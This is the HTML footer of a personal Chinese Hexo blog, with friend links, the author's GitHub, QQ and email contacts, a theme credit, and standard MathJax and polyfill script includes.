            <div class="foot-item">
              <div class="foot-item__head">朋友</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link"
                         height="20px"
                         width="20px"
                         src="/images/icon/icon-link.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
                  </div>
                
                  <div class="text">
                    <img alt="link"
                         height="20px"
                         width="20px"
                         src="/images/icon/icon-link.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
                  </div>
                
                <div class="text">
                  <img alt="link"
                       height="20px"
                       width="20px"
                       src="/images/icon/icon-link+.svg"/>
                  <a class="foot-link"
                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
                  申请友链</a>
                </div>
              </div>
            </div>
          
          
            <div class="foot-item">
              <div class="foot-item__head">账号</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
                  </div>
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
                    <a class="foot-link" href="">735587142</a>
                  </div>
                
              </div>
            </div>
          
          <div class="foot-item">
            <div class="foot-item__head">联系</div>
            <div class="foot-item__body">
              <div class="text">
                <img alt="link"
                     height="20px"
                     width="20px"
                     src="/images/icon/icon-email.svg"/>
                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
              </div>
            </div>
          </div>
        </div>
        <div class="copyright">
          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
          <svg width="20" height="20" viewBox="0 0 725 725">
            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
          </svg>
          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
        </div>
      </div>
    </div>
    
      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
    
    
  
  
    <script type="text/javascript" src=/js/toc.js></script>
  

  </body>
</html>
